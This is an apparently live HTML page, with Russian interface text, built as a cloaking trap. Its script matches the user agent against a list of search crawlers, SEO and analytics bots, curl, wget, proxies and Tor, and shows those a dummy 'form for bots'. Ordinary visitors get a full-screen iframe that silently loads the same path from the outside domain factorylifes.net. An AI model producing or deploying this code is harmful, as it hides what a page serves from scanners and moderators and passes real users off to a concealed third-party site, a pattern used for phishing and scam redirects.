<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        html,
        body {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            width: 100%;
            height: 100%;
            position: relative;
        }

        h1 {
            color: #333;
        }

        p {
            color: #666;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .button {
            background-color: #007bff;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }

        .button:hover {
            background-color: #0056b3;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            position: absolute;
            top: 0;
            left: 0;
        }
    </style>
    <script>
        const domain = "factorylifes.net"
        function isBot() {
            const userAgent = navigator.userAgent;
            const botKeywords = [
                "Googlebot", "Bingbot", "YandexBot", "DuckDuckGo", "Baiduspider", "Slurp", "ia_archiver",
                "facebookexternalhit", "Twitterbot", "LinkedInBot", "Pinterest", "Slackbot", "WhatsApp",
                "TelegramBot", "VKbot", "Instagram",
                "AhrefsBot", "SemrushBot", "MozBot", "Screaming Frog", "MJ12bot", "SiteExplorer",
                "SeobilityBot", "CCBot", "Go-http-client", "python-requests", "curl", "wget",
                "Feedfetcher-Google", "Feedly", "NewsGator", "FeedDemon", "Bloglines",
                "Alexa Toolbar", "Mail.RU_Bot", "YandexMetrika", "Rambler",
                "Google Analytics", "Matomo", "Piwik", "Clicky",
                "Scraper", "Proxy", "Anonymouse", "Tor",
            ];

            for (const keyword of botKeywords) {
                if (userAgent.includes(keyword)) {
                    return true;
                }
            }
            return false;
        }

        window.onload = function () {
            if (isBot()) {
                document.body.innerHTML = `
                    <div class="container">
                        <h1>Форма для ботов</h1>
                        <p>Заполните форму ниже:</p>
                        <form>
                            <input type="text" placeholder="Имя" required>
                            <input type="email" placeholder="Email" required>
                            <input type="text" placeholder="Сообщение" required>
                            <button type="submit" class="button">Отправить</button>
                        </form>
                    </div>
                `;
            } else {
                const currentPath = window.location.pathname; // Получаем текущий путь
                const newUrl = `https://${domain}${currentPath}`; // Создаем новый URL

                // Добавляем iframe
                document.body.innerHTML = `
                    <iframe src="${newUrl}" allowfullscreen></iframe>
                `;
            }
        };
    </script>
</head>

<body>
</body>

</html>
